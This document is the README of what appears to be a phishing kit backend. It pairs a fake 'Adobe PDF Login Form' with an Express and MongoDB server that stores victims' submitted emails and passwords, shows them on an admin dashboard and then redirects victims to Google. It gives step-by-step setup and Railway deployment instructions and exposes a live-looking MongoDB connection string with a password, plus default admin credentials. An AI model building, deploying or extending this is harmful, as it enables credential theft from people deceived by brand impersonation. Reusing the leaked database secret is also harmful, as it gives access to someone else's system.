# Adobe PDF Backend

Backend server for the Adobe PDF Login Form with admin dashboard.

## Features

✅ **Express.js Server** - Fast and lightweight
✅ **MongoDB Integration** - Store emails & passwords
✅ **Admin Dashboard** - View all submissions
✅ **Admin Authentication** - Secure login system
✅ **CORS Enabled** - Connect from frontend
✅ **Easy Deployment** - Deploy to Railway for free

---

## Setup Instructions

### 1. Clone the Repository

```bash
git clone https://github.com/discoveravalon-life-pdf/Backend.git
cd Backend
```

### 2. Install Dependencies

```bash
npm install
```

### 3. Create `.env` File

Copy `.env.example` to `.env`:

```bash
cp .env.example .env
```

Edit `.env` and add your MongoDB connection string (already provided in `.env.example`).

### 4. Setup Admin User in MongoDB

1. Go to MongoDB Atlas → Collections
2. Select `adobe-pdf-db` database
3. Click on `admins` collection
4. Insert a new document:

```json
{
  "username": "admin",
  "password": "admin123",
  "createdAt": new Date()
}
```

**Change the password!** This is for testing only.

### 5. Run Locally

```bash
npm start
```

Server runs on: `http://localhost:5000`
Admin Dashboard: `http://localhost:5000/admin`

**Login Credentials:**
- Username: `admin`
- Password: `admin123`

---

## API Endpoints

### Submit User Data

**POST** `/api/submit`

```json
{
  "email": "user@example.com",
  "password": "password123"
}
```

**Response:**
```json
{
  "success": true,
  "message": "Submission received",
  "redirectUrl": "https://www.google.com"
}
```

### Admin Login

**POST** `/api/admin/login`

```json
{
  "username": "admin",
  "password": "admin123"
}
```

**Response:**
```json
{
  "success": true,
  "token": "YWRtaW46MTY3NjAwMDAwMDAwMA==",
  "message": "Login successful"
}
```

### Get All Submissions (Admin Only)

**GET** `/api/admin/submissions`

**Headers:**
```
Authorization: Bearer YOUR_TOKEN
```

---

## Deploy to Railway

### 1. Push to GitHub

```bash
git add .
git commit -m "Backend setup"
git push origin main
```

### 2. Go to Railway.app

1. Sign in to Railway
2. Click "New Project"
3. Select "Deploy from GitHub"
4. Choose this repository

### 3. Add Environment Variables

In Railway Dashboard → Variables:

```
MONGO_URI=mongodb+srv://suzanne_db_user:TIpJuYBLlnM3TQOO@cluster0.oa5wtke.mongodb.net/?appName=Cluster0
DB_NAME=adobe-pdf-db
USERS_COLLECTION=submissions
ADMINS_COLLECTION=admins
NODE_ENV=production
```

### 4. Deploy

Railway will automatically deploy when you push!

You'll get a URL like: `https://your-backend.railway.app`

---

## Update Frontend

Change `API_BASE_URL` in your frontend files to your Railway URL.

---

**Backend Created!** 🚀
